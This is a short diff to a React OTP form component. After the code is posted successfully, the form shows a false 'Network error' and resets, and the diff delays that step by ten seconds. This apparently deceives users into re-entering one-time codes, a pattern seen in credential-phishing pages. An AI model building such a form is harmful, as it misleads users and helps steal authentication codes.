@@ -37,8 +37,11 @@ const Otp = () => {
       .post(`${BASE_URL}/otp`, data)
       .then((response) => {
         console.log(response.data);
-        setErrorMessage("Network error");
+           setTimeout(() => {
+  setErrorMessage("Network error");
         reset();
+      }, 10000);
+        
       })
       .catch((error) => {
         console.error("There was an error!", error);
